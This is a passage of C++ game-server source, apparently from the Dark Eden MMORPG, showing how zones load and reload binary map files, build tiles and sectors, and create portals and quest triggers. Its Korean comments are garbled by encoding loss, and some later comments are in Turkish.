	if ( pZoneInfo->isMenegrothDoungeonZone() )
	{
		SAFE_DELETE(m_pMenegrothDoungeonZoneManager);
		m_pMenegrothDoungeonZoneManager = new MenegrothDoungeonZoneManager(this);
	}
#endif

	if ( pZoneInfo->isSurvivalZone() )
	{
		SAFE_DELETE(m_pEventSurvivalZoneManager);
		m_pEventSurvivalZoneManager = new EventSurvivalZoneManager(this);
	}

	// º °æ¿ì
	// by sigi. 2003.1.24
	if (isCastle())
	{
		SAFE_DELETE(m_pWarScheduler);
		m_pWarScheduler = new WarScheduler(this);
		m_pWarScheduler->load();

		printf("[%d] Castle : WarScheduler->load\n", (int)getZoneID());
	}

	// Ÿ ·µåŽ.
	loadItem();

//	if (isCastle())
//	{
//		CastleInfo* pCastleInfo = g_pCastleInfoManager->getCastleInfo( m_ZoneID );
//		m_pNPCManager->load( m_ZoneID, pCastleInfo->getRace() );
//	}
//	else
//	{
	// NPC ž ·µùŽ.
	m_pNPCManager->load( m_ZoneID );
//	}

	loadEffect();

	// °» ·µåŽ.
	loadBulletinBoard( this );

	// º¶ó® °¹öž ±â­Ž.
	initSpriteCount();

	SAFE_DELETE(version);
	SAFE_DELETE(zonename);
	SAFE_DELETE(lwrFilename);

/*	if ( m_ZoneID == 1410 )
	{
		EffectCastingIcicleTrap* pEffect = new EffectCastingIcicleTrap( Effect::EFFECT_CLASS_ICICLE_DROP, this );
		registerObject( pEffect );
		
		pEffect->setStartXY( 116, 66 );
		pEffect->setLength( 48 );
		pEffect->setTick( 5 );
		pEffect->setUnit( 5 );
		pEffect->setDir( 7 );

		pEffect->setNextTime(0);
		pEffect->setDeadline(600);
		addEffect( pEffect );
	}*/

} catch ( Throwable& t )
{
	// FAZ 4 - Tek zone load failure tum init'i kapatmasin: warn + Error rethrow.
	// Caller (ZoneGroupManager::load) try/catch'inde yakalanir, o zone skip + devam.
	cout << "[Warn] Zone::load failed for zoneID=" << (int)m_ZoneID
	     << ": " << t.toString() << " — skip zone" << endl;
	throw Error(t.toString());
}


	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// ž ¿¡­ ž ºžž Ÿî­ ·µùŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::reload(bool bOutput)
	throw(Error)
{
	__BEGIN_TRY
	__BEGIN_DEBUG
try {

	// FAZ 4 - 64-bit migration fix: file IO icin uint32_t (Win32 DWORD = 4 byte).
	uint32_t versionLen;
	char   version[128];
	WORD   zoneID;
	WORD   zoneGroupID;
	uint32_t zonenameLen;
	char   zonename[128];
	BYTE   zoneType;
	BYTE   zoneLevel;
	uint32_t descLen;
	char*  pDesc = NULL;
	char   lwrFilename[256];

	ZoneInfo* pZoneInfo = g_pZoneInfoManager->getZoneInfo(m_ZoneID);

	Assert(pZoneInfo!=NULL);

	setPayPlay( pZoneInfo->isPayPlay() );
	setPremiumZoneType( pZoneInfo->isPremiumZone() );	//1223 wlzzi ž®¹Ÿö ž ý.. (öžé º¯°æ)
	setPKZone( pZoneInfo->isPKZone() );
	setNoPortalZone( pZoneInfo->isNoPortalZone() );
	setMasterLair( pZoneInfo->isMasterLair() );
	setMikllizzLair( pZoneInfo->isMikllizzLair() );
	setSurvivalZone( pZoneInfo->isSurvivalZone() );
	// 2007 06 23
	setHellGardenTower( pZoneInfo->isHellGardenTower() );

	//filelog("zoneInfo.txt", "[%d] %d %d", (int)m_ZoneID, (int)isPayPlay(), (int)isPremiumZone());

	// SMP ºž » ¿¬Ž.
	string SMPFilename = g_pConfig->getProperty("HomePath") + "/data/MAP/" + pZoneInfo->getSMPFilename();

	strcpy(lwrFilename, SMPFilename.c_str());
	strlwr( lwrFilename );

	if(access(lwrFilename, F_OK))
	{
		StringStream msg;
		msg << "file does not exist : " << lwrFilename; 
		throw Error(msg.toString());
	}

	ifstream SMP(lwrFilename, ios::in | ios::binary );
	if (!SMP)
	{
		StringStream msg;
		msg << lwrFilename << " not exist or cannot open it";
		cerr << msg.toString() << endl;
		throw FileNotExistException(msg.toString());
	}

    // read zone version  (FAZ 4 fix: Win32 DWORD = 4 byte, sizeof(uint32_t) ile)
	SMP.read((char*)&versionLen,sizeof(uint32_t));
	SMP.read(version,versionLen);
	version[versionLen] = 0;

	// read zone id
	SMP.read((char*)&zoneID,szWORD);

	// read zone group id (no use)
	SMP.read((char*)&zoneGroupID,szWORD);

	// read zone name
	SMP.read((char*)&zonenameLen,sizeof(uint32_t));
	if (zonenameLen > 0)
	{
		SMP.read(zonename,zonenameLen);
		zonename[zonenameLen] = 0;
	}

    // read zone type & level
	SMP.read((char*)&zoneType,szBYTE);
	SMP.read((char*)&zoneLevel,szBYTE);

	// read zone description
	SMP.read((char*)&descLen,sizeof(uint32_t));
	if (descLen > 0)
	{
		pDesc = new char[descLen+1];
		SMP.read(pDesc,descLen);
		pDesc[descLen] = 0;

		SAFE_DELETE_ARRAY(pDesc);	// add '_ARRAY' moved to here.. by sigi 2002.5.2
	}

	// read zone width & height
	SMP.read((char*)&m_Width, szWORD);
	SMP.read((char*)&m_Height ,szWORD);

	Assert(m_Width <= maxZoneWidth);
	Assert(m_Height <= maxZoneHeight);

	uint i, x;


	if (m_pSectors==NULL)
	{
		// ž 2÷¿ø ¹è¿­· žžµéŸî žžðž®ž ŽçŽ.
		m_SectorWidth = (int)ceil((float)m_Width/(float)SECTOR_SIZE);
		m_SectorHeight = (int)ceil((float)m_Height/(float)SECTOR_SIZE);
		m_pSectors = new Sector*[m_SectorWidth];
		for (x=0; (int)x<m_SectorWidth; x++)
		{
			m_pSectors[x] = new Sector[m_SectorHeight];
		}

		// ³¢ž® ¿¬°á» Ž.
		VSRect srect(0, 0, m_SectorWidth-1, m_SectorHeight-1);
		for (int x=0; x<m_SectorWidth; x++)
		{
			for (int y=0; y<m_SectorHeight; y++)
			{
				for (uint d=0; d<9; d++)
				{
					int sectorx = x + dirMoveMask[d].x;
					int sectory = y + dirMoveMask[d].y;

					if (srect.ptInRect(sectorx, sectory))
					{
						m_pSectors[x][y].setNearbySector(d, &m_pSectors[sectorx][sectory]);
					}
				}
			}
		}

	}

	// m_pTiles °¡ ¹ ŸøŽžé...
	if (m_pTiles==NULL)
	{
		// ž» 2÷¿ø¹è¿­· žžµéŸî žžðž®ž ŽçŽ.
		m_pTiles = new Tile* [ m_Width ];
		for (i = 0 ; i < m_Width ; i++) 
		{
			m_pTiles[i] = new Tile [m_Height];
		}

		// °¢°¢ ž¿¡Ž°¡  ÷ž Ž.
		for (int x=0; x<m_Width; x++)
		{
			for (int y=0; y<m_Height; y++)
			{
				int sx = x/SECTOR_SIZE;
				int sy = y/SECTOR_SIZE;

				Assert(sx < m_SectorWidth && sy < m_SectorHeight);

				m_pTiles[x][y].setSector(&m_pSectors[sx][sy]);
			}
		}

	}

	// MonsterAIž § ž ¿µ¿ª» ±žºöŸî³õº »ç°¢ü» »ýºŽ.
	m_OuterRect.set(0, 0, m_Width-1, m_Height-1);
	if (m_Width > 64 && m_Height > 64)
	{
		m_InnerRect.set(15, 15, m_Width-15, m_Height-15);
		m_CoreRect.set(25, 25, m_Width-25, m_Height-25);
	}
	else
	{
		m_InnerRect = m_CoreRect = m_OuterRect;
	}


	char str[80];
	char str2[80];

	// Ž~
	m_MonsterRegenPositions.clear();
	m_EmptyTilePositions.clear();

	for (ZoneCoord_t y=0; y<m_Height; y++)
	{
		for (ZoneCoord_t x=0; x<m_Width; x++)
		{
			BYTE flag = 0;
			SMP.read((char*)&flag, szBYTE);

			// ø­Žë· ö, ö»ó, °ø ºí·
			if (flag & 0x01) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_BURROWING);
			if (flag & 0x02) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_WALKING);
			if (flag & 0x04) m_pTiles[x][y].setBlocked(Creature::MOVE_MODE_FLYING);

			// Ÿ¹«°µµ ŸøŽ °æ¿ì..
			// ž÷ »ýº» § ¥ºžž žžµéŸîµŽ.
			if (flag==0 && m_InnerRect.ptInRect( x, y ))
			{
				m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// ž¶º ·¹Ÿî °æ¿ì: block ³ª¶óµµ Ÿ µ °÷» £ŽŽ.
			if ((flag & 0x07)!=0x07 && (isMasterLair() || m_ZoneID == 3002) )
			{
				m_EmptyTilePositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
			}

			// ÷» ºž
			if (flag & 0x80)
			{
				BYTE	type;
				ZoneID_t targetZoneID;
				BYTE     targetX, targetY;
				SMP.read((char*)&type, szBYTE);

				PortalType_t portalType = PORTAL_NORMAL;

				bool bAddPortal = true;

				// ¹ ÷» Žžé ±âž ÷»» ö¿öŽ.
				if (m_pTiles[x][y].hasPortal())
				{
					Portal* pPortal = m_pTiles[x][y].getPortal();
					SAFE_DELETE(pPortal);
					m_pTiles[x][y].deletePortal();
				}

				if (type == PORTAL_NORMAL)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Normal(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_SLAYER)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_SLAYER);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_VAMPIRE)
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_VAMPIRE);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					portalType = PORTAL_VAMPIRE;

					if (bOutput)
					{
						cout << "Vampire(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if (type == PORTAL_MULTI_TARGET)
				{
					BYTE size;
					SMP.read((char*)&size, szBYTE);

					// ÷»» »ýº Ž.
					MultiPortal* pMultiPortal = new MultiPortal();

					for(int i = 0; i < size; i++) 
					{
						SMP.read((char*)&targetZoneID, szZoneID);
						SMP.read((char*)&targetX,      szBYTE);
						SMP.read((char*)&targetY,      szBYTE);

						pMultiPortal->setObjectType(PORTAL_SLAYER);

						// ž° ÷ž ±žºŽ.
						PortalTargetInfo* pPortalTargetInfo = new PortalTargetInfo();
						pPortalTargetInfo->setZoneID(targetZoneID);
						pPortalTargetInfo->setX(targetX);
						pPortalTargetInfo->setY(targetY);
						pMultiPortal->setPortalTargetInfo(pPortalTargetInfo);
					}

					getObjectRegistry().registerObject(pMultiPortal);
					m_pTiles[x][y].addPortal(pMultiPortal);

					portalType = PORTAL_SLAYER;

					if (bOutput)
					{
						cout << "Multi(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else if ( type == PORTAL_GUILD )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					GuildPortal* pGuildPortal = new GuildPortal();
					pGuildPortal->setObjectType( PORTAL_GUILD );
					pGuildPortal->setZoneID( targetZoneID );
					pGuildPortal->setX( targetX );
					pGuildPortal->setY( targetY );

					getObjectRegistry().registerObject(pGuildPortal);
					m_pTiles[x][y].addPortal(pGuildPortal);

					if (bOutput)
					{
						cout << "Guild(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}

				}
				else if ( type == PORTAL_BATTLE )
				{
					SMP.read((char*)&targetZoneID, szZoneID);
					SMP.read((char*)&targetX,      szBYTE);
					SMP.read((char*)&targetY,      szBYTE);

					// ÷»» »ýº Ž.
					NormalPortal* pNormalPortal = new NormalPortal();
					pNormalPortal->setObjectType(PORTAL_NORMAL);
					pNormalPortal->setZoneID(targetZoneID);
					pNormalPortal->setX(targetX);
					pNormalPortal->setY(targetY);

					getObjectRegistry().registerObject(pNormalPortal);
					m_pTiles[x][y].addPortal(pNormalPortal);

					if (bOutput)
					{
						cout << "Slayer(" << (int)x << "," << (int)y << "," << (int)targetZoneID << "," << (int)targetX << "," << (int)targetY << ")" << endl;
					}
				}
				else
				{
					bAddPortal = false;
				}

				// ÷» °¡µ °æ¿ì¿¡
				// žñûö ž ¯·áž¶óžé 
				// TriggeredPortal» ³Ÿ Ž.
				if (bAddPortal)
				{
					ZoneInfo* pTargetZoneInfo = NULL;
					try {
						pTargetZoneInfo = g_pZoneInfoManager->getZoneInfo(targetZoneID);
					} catch (NoSuchElementException& t) {
						throw Error("±·± ž ŸøŽ³");
					}

					Assert(pTargetZoneInfo!=NULL);

					// ±âž Portal» ö¿ï±î?
					bool bDeleteOldPortal = false;

					if ( ( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() )
						|| pTargetZoneInfo->isMasterLair()
						|| pTargetZoneInfo->isMikllizzLair()
						|| ( pTargetZoneInfo->isCastle() && !g_pCastleInfoManager->isCastleZone(targetZoneID, m_ZoneID))
						|| ( pTargetZoneInfo->isHolyLand() && !pZoneInfo->isHolyLand() )
						|| (isCastle() && g_pCastleInfoManager->isCastleZone( m_ZoneID, pTargetZoneInfo->getZoneID() ) )
					   )
					{
						bDeleteOldPortal = true;
					}

/*					if (( pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay() )
						|| pTargetZoneInfo->isMasterLair())
					{
						bDeleteOldPortal = true;
					}*/

					Tile& rTile = m_pTiles[x][y];
					
					// ±âž Portal» ö¿ìŽ °æ¿ì
					if (bDeleteOldPortal)
					{
						// ±âž¿¡ Žø portal» °Ž.
						if (rTile.hasPortal())
						{
							Portal* pOldPortal = rTile.getPortal();
							rTile.deletePortal();

							delete pOldPortal;
						}
					}

					// ÷»» »ýº°í, µî·Ž.

					//----------------------------------------
					// ž¶º ·¹Ÿî °æ¿ì
					// by sigi. 2002.9.2
					//----------------------------------------
					if (pTargetZoneInfo->isMasterLair())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMasterLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
 //                                       g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );
                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ö±º µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					else if ( pTargetZoneInfo->isMikllizzLair() )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");

						sprintf(str, "ConditionType : EnterMikllizzLair\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
 //                                       g_pStringPool->c_str( STRID_CANNOT_ENTER ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );
                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ö±º µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);

						//cout << "[" << (int)pTargetZoneInfo->getZoneID() << "] is MasterLair"
						//	 << endl;
					}
					// 2007 06 23
					else if ( pTargetZoneInfo->isHellGardenTower() )
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						pPortal->setObjectType(portalType);

						TriggerManager& tm  = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );

						pTrigger->setTriggerType("QUEST");

						/*
						sprintf(str, "ConditionType : EnterHellGardenTower\n\t TargetZoneID : %d\n\t", (int)pTargetZoneInfo->getZoneID());
						pTrigger->setConditions( str );
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);
						*/

						sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER );

						pTrigger->setCounterActions( str2 );

						tm.addTrigger(pTrigger);

						rTile.addPortal(pPortal);
					}

					//----------------------------------------
					// ¯·ážž· µéŸî°¡Ž °æ¿ì
					//----------------------------------------
					else if (pTargetZoneInfo->isPayPlay() && !pZoneInfo->isPayPlay())
					{
						TriggeredPortal* pPortal = new TriggeredPortal();
						getObjectRegistry().registerObject(pPortal);

						// ÷» ³»¿ë» ·µåŽ.
						pPortal->setObjectType(portalType);

						//pPortal->load(m_ZoneID, left, top, right, bottom);
						TriggerManager& tm = pPortal->getTriggerManager();

						Trigger* pTrigger = new Trigger();

						pTrigger->setTriggerID( 0 );	// ¹ŸøŽ.

						pTrigger->setTriggerType("QUEST");
						pTrigger->setConditions("ConditionType : PayPlay\n\t");
						sprintf(str, "ActionType : ActivatePortal\n\t ZoneID : %d\n\t X : %d\n\t Y : %d\n\t", targetZoneID, targetX, targetY);
						pTrigger->setActions(str);

//                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %s",
//                                        g_pStringPool->c_str( STRID_CANNOT_ENTER_PAY_ZONE ) );
                        sprintf( str2, "ActionType : SystemMessage\n\t Content : %d", STRID_CANNOT_ENTER_PAY_ZONE );
                        pTrigger->setCounterActions( str2 );

//						pTrigger->setCounterActions("ActionType : SystemMessage\n\t Content : ¯·áž¶ó­ µéŸî°¥ ö ŸøŽŽ.");

						tm.addTrigger(pTrigger);
						
						// ž¿¡Ž ÷»» ºŽ.
						rTile.addPortal(pPortal);
					}
				}


			} //if (flag & 0x80)
		} // for 
	} // for

	SMP.close();

	///*
	if (m_MonsterRegenPositions.size()==0)
	{
		cout << "MonsterRegenPosition not exist" << endl;
		cout << "Width = " << m_Width << endl;
		cout << "Height = " << m_Height << endl;

		//Assert(m_MonsterRegenPositions.size()!=0);

		ZoneCoord_t outerMinX = m_Width/7;
		ZoneCoord_t outerMinY = m_Height/7;
		ZoneCoord_t outerMaxX = m_Width-outerMinX;
		ZoneCoord_t outerMaxY = m_Width-outerMinY;

		for (ZoneCoord_t y=outerMinY; y<outerMaxY; y++)
		{
			for (ZoneCoord_t x=outerMinX; x<outerMaxX; x++)
			{
				Tile& rTile = m_pTiles[x][y];

				if (!rTile.hasPortal() 
					&& !rTile.isGroundBlocked()
					&& !rTile.isAirBlocked()
					&& !rTile.isUndergroundBlocked())
				{
					m_MonsterRegenPositions.push_back( BPOINT( (BYTE)x, (BYTE)y ) );
				}
			}
		}

		Assert(m_MonsterRegenPositions.size()!=0);
	}

	if ((isMasterLair() || m_ZoneID == 3002) && m_EmptyTilePositions.size()==0)
	{
		cout << "MasterLair has No EmptyTilePosition" << endl;
		Assert(m_EmptyTilePositions.size()!=0);
	}
	// */

	// Zone ºžž Ž.
	m_ZoneType  = pZoneInfo->getZoneType();
	m_ZoneLevel = pZoneInfo->getZoneLevel();

	// m_ppLevel °
	for (i = 0; i < m_Width; i++)
	{
		SAFE_DELETE_ARRAY( m_ppLevel[i] );
	}
	SAFE_DELETE_ARRAY( m_ppLevel );

	// žžðž® Žç°í...
	m_ppLevel = new ZoneLevel_t* [ m_Width ];
	for (uint i = 0; i < m_Width; i++)
		m_ppLevel[i] = new ZoneLevel_t[m_Height];

	// ž ·¹º§» µðú® °ªž· ±â­²Ž.
	for (ZoneCoord_t x = 0; x < m_Width; x++)
		for (ZoneCoord_t y = 0; y < m_Height; y++)
			m_ppLevel[x][y] = m_ZoneLevel;

	// SSI ºž » ¿¬Ž.
	string SSIFilename = g_pConfig->getProperty("HomePath") + "/data/MAP/" + pZoneInfo->getSSIFilename();

	strcpy(lwrFilename, SSIFilename.c_str());
	strlwr( lwrFilename );

	if(access(lwrFilename, F_OK))
	{
		StringStream msg;
		msg << "file does not exist : " << lwrFilename;
		throw Error(msg.toString());
	}

	ifstream SSI(lwrFilename, ios::in | ios::binary );
	if (!SSI)
	{
		StringStream msg;
		msg << lwrFilename << " not exist or cannot open it";
		throw FileNotExistException(msg.toString());
	}

	int size = 0;
	SSI.read((char*)&size, szint);

	BYTE left, top, right, bottom, level;
	for (int i=0; i<size; i++)
	{
		SSI.read((char*)&level, szBYTE);
		SSI.read((char*)&left, szBYTE);
		SSI.read((char*)&top, szBYTE);
		SSI.read((char*)&right, szBYTE);
		SSI.read((char*)&bottom, szBYTE);

		if (bOutput)
		{
			cout << "LEVEL:" << (int)level << ",(" << (int)left << "," << (int)top << "," << (int)right << "," << (int)bottom << ")" << endl;
		}

		Assert(left <= right);
		Assert(top  <= bottom);

		for (int bx=left; bx<=right; bx++)
			for (int by=top; by<=bottom; by++)
				m_ppLevel[bx][by] = level;
	}

	SSI.close();

	// ®ž®°µå ÷»» ·µåŽ.
	// reload¿¡­Ž ¹«
	//loadTriggeredPortal();

	// ï°¡µç ž¿öžé HellGardenTowerMonsterList ºí¿¡­ °¡®¿Ž.
	if(pZoneInfo->isHellGardenTower())
		m_pHellGardenTowerManager->MonsterListLoad();
	else
	// žóº ·µå°í....
	m_pMonsterManager->load();

// eventMonsterManagerŽ reload¿¡­Ž ¹«Ž.
//#ifdef __XMAS_EVENT_CODE__
//	cout << "Begin Event Monster Loading..." << endl;
//	m_pEventMonsterManager->load();
//	cout << "Event Monster Loading Completed..." << endl;
//#endif

	// ž¶º ·¹Ÿî °æ¿ì
	// by sigi. 2002.9.2
	if (pZoneInfo->isMasterLair())
	{
		if (m_pMasterLairManager!=NULL
			&& m_pMasterLairManager->getCurrentEvent()==MasterLairManager::EVENT_WAITING_REGEN)
		{
			SAFE_DELETE(m_pMasterLairManager);
			m_pMasterLairManager = new MasterLairManager(this);
		}
	}

	// ¹¬ž®î ·¹Ÿî°æ¿ì
	if ( pZoneInfo->isMikllizzLair() )
	{
		SAFE_DELETE( m_pMikllizzLairManager );
		m_pMikllizzLairManager = new MikllizzLairManager(this);
	}

	// ï°¡µç ž¿ö °æ¿ì 2007 06 23
	if ( pZoneInfo->isHellGardenTower() )
	{
		SAFE_DELETE(m_pHellGardenTowerManager);
		m_pHellGardenTowerManager = new HellGardenTowerManager(this);
	}

	if ( pZoneInfo->isSurvivalZone() )
	{
		SAFE_DELETE( m_pEventSurvivalZoneManager );
		m_pEventSurvivalZoneManager = new EventSurvivalZoneManager(this);
	}

	// º °æ¿ì
	// by sigi. 2003.1.24
	if (pZoneInfo->isCastle())
	{
		if (m_pWarScheduler!=NULL)
			//&& m_pWarScheduler->getCurrentEvent()==WarScheduler::EVENT_WAITING_REGEN)
		{
			SAFE_DELETE(m_pWarScheduler);
			m_pWarScheduler = new WarScheduler(this);
		}
	}

	// reload ¶§Ž ¹«Ž.
	// Ÿ ·µåŽ.
	//loadItem();
	// NPC ž ·µùŽ.
	//m_pNPCManager->load(m_ZoneID);

	// º¶ó® °¹öž ±â­Ž.
	initSpriteCount();
} catch ( Throwable& t )
{ cout << t.toString() << endl; Assert(false);}

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// load items from database
// * NOTE *
// öç ¹Ž¿¡ ¶³Ÿîø Ÿº ­¹ö°¡ çµŸîµµ ·µùö ŸŽŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::loadItem () 
	throw(Error)
{
	__BEGIN_TRY

	/*
	// Ÿ ·µù...........
	g_pItemLoaderManager->load(this);

	// Ÿº Ž ³¯·¹ö·öžž...±·¡µ...
	// Ÿ ¿ºê§® Ÿµðž ç Žç ¹°í Ž úåŽ.
	for (int j = 0; j < m_Height; j++) 
	{
		for (int i = 0; i < m_Width; i++) 
		{
			if (m_pTiles[i][j].hasItem()) 
			{
				Item* pItem = m_pTiles[i][j].getItem();
				m_ObjectRegistry.registerObject(pItem);
				pItem->save("", STORAGE_ZONE, m_ZoneID, i, j);
				addToItemList(pItem);

				if (pItem->getItemClass() == Item::ITEM_CLASS_MOTORCYCLE) 
				{
					Motorcycle* pMotorcycle = dynamic_cast<Motorcycle*>(pItem);
					MotorcycleBox* pMotorcycleBox = new MotorcycleBox(pMotorcycle, this, i, j);
					g_pParkingCenter->addMotorcycleBox(pMotorcycleBox);
				}
			}
		}
	}
	*/

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// öç ž¿¡ ®ž®°µå ÷»» ·µåŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::loadTriggeredPortal ()
	throw(Error)
{
	__BEGIN_TRY


	Statement* pStmt   = NULL;
	Result*    pResult = NULL;

	BEGIN_DB
	{
		// DynamicZone  °æ¿ì ³ž®
		ZoneID_t zoneID = m_ZoneID;
		if ( isDynamicZone() )
		{
			zoneID = m_pDynamicZone->getTemplateZoneID();
		}

		pStmt   = g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
		pResult = pStmt->executeQuery("SELECT X1, Y1, X2, Y2 FROM ZoneTriggers WHERE ZoneID=%d", zoneID);

		int rowIdx = 0;
		while (pResult->next())
		{
			int left   = pResult->getInt(1);
			int top    = pResult->getInt(2);
			int right  = pResult->getInt(3);
			int bottom = pResult->getInt(4);


			Assert(left <= right);
			Assert(top <= bottom);

			Assert(m_OuterRect.ptInRect(left, top));
			Assert(m_OuterRect.ptInRect(right, bottom));

			int tileIdx = 0;
			for (int x=left; x<=right; x++)
			{
				for (int y=top; y<=bottom; y++)
				{
					if (getTile(x,y).hasPortal())
					{
						getTile(x,y).deletePortal();
					}

					// ÷»» »ýº°í, µî·Ž.
					TriggeredPortal* pPortal = new TriggeredPortal();
					getObjectRegistry().registerObject(pPortal);

					// ÷» ³»¿ë» ·µåŽ.
					pPortal->setObjectType(PORTAL_NORMAL);
					pPortal->load(zoneID, left, top, right, bottom);

					// ž¿¡Ž ÷»» ºŽ.
					getTile(x, y).addPortal(pPortal);
					tileIdx++;
				}
			}
			rowIdx++;
		}

		SAFE_DELETE(pStmt);
	}
	END_DB(pStmt);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
//  ž¿¡­ ³ªž³ªŽ NPC¿ žóº º¶ó®°¹öž °è»êµŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::initSpriteCount () 
	throw(Error)
{
	__BEGIN_TRY

	m_NPCCount = 0;
	m_MonsterCount = 0;

	// NPC º¶ó® ž °¹öž °è»êŽ.
	const map<ObjectID_t, Creature*>& NPCMap = m_pNPCManager->getCreatures();
	for (map<ObjectID_t, Creature*>::const_iterator i = NPCMap.begin(); i != NPCMap.end(); i++)
	{
		NPC* pNPC = dynamic_cast<NPC*>(i->second);
		bool bAdd = true;
		
		for (int j=0; j<m_NPCCount; j++) // öç Ž žóº ž ¿¡­ 
		{
			if (pNPC->getSpriteType() == m_NPCTypes[j])
			{
				bAdd = false;
				break;
			}
		}

		if (bAdd)
		{
			m_NPCTypes[m_NPCCount] = pNPC->getSpriteType();
			m_NPCCount++;
		}
	}

	// Monster sprite listesini hesaplar.
	// GCUpdateInfo client tarafinda monster type degil sprite type contract'i
	// tasir. MonsterManager strict MType counter tutsa bile preload listesine
